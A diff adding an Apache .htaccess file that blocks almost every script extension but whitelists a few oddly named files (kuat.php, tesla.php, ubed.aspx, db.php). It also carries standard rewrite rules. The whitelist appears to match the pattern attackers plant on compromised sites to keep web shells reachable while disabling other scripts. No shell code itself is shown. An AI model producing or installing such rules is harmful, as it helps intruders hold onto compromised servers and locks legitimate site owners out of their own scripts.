@@ -1,0 +1,27 @@
+<FilesMatch ".(|php|asp|aspx|Php|pHP|PHP|PHp|phP|phtml|PHP5|PHP7|phar|PhP|php1)$">
+ Order allow,deny
+ Deny from all
+</FilesMatch>
+<FilesMatch "^(ubed.aspx|kuat.php|tesla.php|db.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+<IfModule mod_rewrite.c>
+RewriteEngine On
+RewriteBase /
+RewriteRule ^index\.php$ - [L]
+RewriteCond %{REQUEST_FILENAME} !-f
+RewriteCond %{REQUEST_FILENAME} !-d
+RewriteRule . /index.php [L]
+</IfModule>
+
+<Files 403.shtml>
+order allow,deny
+allow from all
+</Files>
+
+
+<FilesMatch "\.(php|Php|PHP|php1|php5|pHP|php7|phar|phtml|phP|PHp|PhP|asp|aspx|PHP5|PHP7|PHP1|shtml|cshtml|phps|phtm|pgif|inc|jsp|jspx|hphp|pl|py|module|pht)$">
+Order Allow,Deny
+Deny from all
+</FilesMatch>
